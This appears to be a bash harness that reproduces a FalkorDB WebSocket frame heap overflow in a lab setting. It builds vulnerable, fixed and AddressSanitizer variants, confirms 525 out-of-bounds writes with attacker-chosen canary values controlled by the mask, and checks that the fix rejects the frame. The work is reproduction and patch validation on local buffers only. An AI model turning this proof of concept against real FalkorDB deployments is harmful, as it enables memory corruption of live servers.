#!/usr/bin/env bash
# Reproduce FalkorDB CVE-2026-107909 (ws_read_frame / buffer_apply_mask).
# Local buffers only: no listener, no socket, no off-loopback probe.
set -u
cd "$(dirname "$0")"
mkdir -p logs

echo "[build] vulnerable / lab-fixed / asan"
gcc -O2 -Wall -o vuln  ws_overflow.c 2>logs/build-vuln.err
gcc -O2 -Wall -DFIXED -o fixed ws_overflow.c 2>logs/build-fixed.err
gcc -O1 -g -fsanitize=address -Wall -o asan ws_overflow.c 2>logs/build-asan.err

echo "[rungs 1/2] declared payload_len=4144, zero payload bytes supplied"
./vuln vuln | tee logs/vuln.out
VULN_RC=${PIPESTATUS[0]}
echo "vuln_rc=$VULN_RC"

echo "[rung 2] alternate 4-byte mask controls the repeated write value"
./vuln alt | tee logs/alt.out

echo "[control] declared length=8, eight payload bytes supplied"
./vuln vuln small | tee logs/control.out

echo "[differential] lab guard rejecting payload_len > available bytes"
./fixed vuln | tee logs/fixed.out
FIXED_RC=${PIPESTATUS[0]}
echo "fixed_rc=$FIXED_RC"

echo "[rung 3] ASan on short subsequent chunks (LAB layout, see brief)"
ASAN_OPTIONS=detect_leaks=0 ./asan asan >logs/asan.out 2>&1
ASAN_RC=$?
grep -m1 -E 'ERROR: AddressSanitizer|SUMMARY:' logs/asan.out || true
echo "asan_rc=$ASAN_RC"

echo "[repeat] three vulnerable runs"
: >logs/repeat.out
for i in 1 2 3; do ./vuln vuln >>logs/repeat.out; done

echo "[digests]"
sha256sum ws_overflow.c run.sh | tee logs/digests.txt

echo "[verdict]"
pass=1
grep -q 'payload_len=4144' logs/vuln.out || { echo "FAIL: frame not parsed"; pass=0; }
grep -q 'oob_writes=525' logs/vuln.out || { echo "FAIL: OOB write count"; pass=0; }
grep -q 'canary offset=104 before=0x0000000000000000 after=0x4242424242424242' logs/vuln.out || { echo "FAIL: chosen canary write"; pass=0; }
[ "$VULN_RC" -eq 0 ] || { echo "FAIL: vulnerable rc $VULN_RC"; pass=0; }
grep -q 'canary offset=104 before=0x0000000000000000 after=0x4141414141414141' logs/alt.out || { echo "FAIL: alternate mask"; pass=0; }
grep -q 'oob_writes=0' logs/control.out || { echo "FAIL: in-bounds control wrote OOB"; pass=0; }
grep -q 'FIXED: reject payload_len=4144' logs/fixed.out || { echo "FAIL: fixed reject"; pass=0; }
grep -q 'oob_writes=0' logs/fixed.out || { echo "FAIL: fixed wrote OOB"; pass=0; }
[ "$FIXED_RC" -eq 0 ] || { echo "FAIL: fixed rc $FIXED_RC"; pass=0; }
grep -q 'ERROR: AddressSanitizer: heap-buffer-overflow' logs/asan.out || { echo "FAIL: ASan report"; pass=0; }
grep -q 'in buffer_apply_mask_single' logs/asan.out || { echo "FAIL: ASan site"; pass=0; }
[ "$ASAN_RC" -ne 0 ] || { echo "FAIL: ASan rc $ASAN_RC"; pass=0; }
[ "$(grep -c 'oob_writes=525' logs/repeat.out)" -eq 3 ] || { echo "FAIL: repeat count"; pass=0; }
if [ "$pass" -eq 1 ]; then echo "ALL CHECKS PASS"; else echo "CHECKS FAILED"; fi
